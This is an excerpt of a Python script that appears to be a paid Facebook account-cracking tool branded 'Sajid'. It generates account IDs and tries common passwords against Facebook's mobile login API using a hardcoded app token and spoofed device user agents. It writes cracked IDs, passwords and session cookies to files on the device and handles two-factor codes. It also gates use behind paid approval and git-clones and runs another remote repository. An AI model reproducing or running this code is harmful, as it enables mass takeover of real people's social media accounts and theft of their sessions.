...
try:
    ...
    print('\x1b[1;92m[√] PLEASE WAIT CHECKING Sajid GULL UPDATE...')
...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
os.system('xdg-open https://www.facebook.com/profile.php?id=100092019200500')
def ua_api():
...
logo=(f"""{WHITE}
{YELLOW}Developed By Sajid_ktk{EXTRA} (OWNER_302)
{GREEN}╭━━━〔S A J I D  ⁩〕━━━┈⊷{BLUE}X {RED} SAJID_KTK{WHITE}
{BLACK}┃✵╭──────────────
{YELLOW}┃✵│ ONWER ✓ MR Sajid 
{RED}┃✵│ GITHUB ✓ Queen3099
{EXTRA}  ┃ TOOLS  ✓ ALL MATHOD
{RED}┃✵│ TEAM   ✓ 302
{YELLOW}┃✵│ CREATE ✓ Sajid_302_OWNER
{RED}┃✵│ STATUS ✓ PAID
{GREEN}┃✵│ BROTHER ✓ DP JOKER
{YELLOW}┃✵│ FACEBOOK ✓Sajid_ktk
{PURPLE}┃✵│ VERSION ✓ V_3.0.2
{RED}┃✵╰──────────────
{RED}╰━━━━━━━━━━━━━━━┈┈⊷
{PURPLE}================================================
\33[37;41m\ SAJID_KTK x FARHAN  x DP_JOKER x hamza \33[0;m
{PURPLE}=================================================""")
...
def approval():
  ...
  try:
    httpCaht = get_response('https://github.com/Queen3099/Mafia/blob/main/Mafia.txt').txt
    if realid in httpCaht:
      ...
      print('\33[1;37m ====================================================')
      print (" \33[37;41m\t WELCOME TO SAJID TOOL AND ENJOY \33[0;m")
      print('\33[1;37m ====================================================')
      print ("\33[1;37m SEND [500] PKR (FOR 15 DAYS APPROVEL)")
      print('\33[1;37m ====================================================')
      print ("\33[1;37m SEND [1k] PKR (FOR 30 DAYS APPROVEL)")
      print('\33[1;37m ====================================================')
      print ("\33[1;37m Easy Paisa (03490093530)")
      print ("\33[37;41m\t INSHALLAH DAILY LUSH UPDATES \33[0;m")
      input(' IIF YOU ARE FREE USER THEN DONT PRESS ENTER')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('xdg-open https://wa.me/message/+923490093530'+tks)
      sys.exit()
      #time.sleep(1)
      #approval()
        ...
        try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                        	...
                        	os.system('xdg-open https://www.facebook.com/profile.php?id=100092019200500&mibextid=ZbWKwL')
                        	menu()
                        elif xd in ['0','00']:
                                exit()
...
def pak():
                ...
                with tred(max_workers=30) as TRT:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','malik123','kingkhan','SAJID123','pak123','khan123']
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/ru_RU;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [SAJID-RUNING-M2 ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/ru_RU;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LEGEND-SAJID-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                     #   print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SAJID-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [ALONE-SAJID-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [SAJID-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/ru_RU;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEGEND-SAJID-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SAJID-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SAJID-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [SAJID-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def Auto2F():
	...
	if response['Status']=="Success":
		...
		for i in codes:
			...
			open('/sdcard/SAJID/SAJID-2F.txt','a').write(id+'|'+ps+'\n'+keys+'\n'+i+'\n')
...
def create():
	os.system("cd && git clone --depth=1 https://github.com/Queen3099/Sajid1")
	os.system('cd && cd Sajid1 ;python Sajid1.py')
menu() 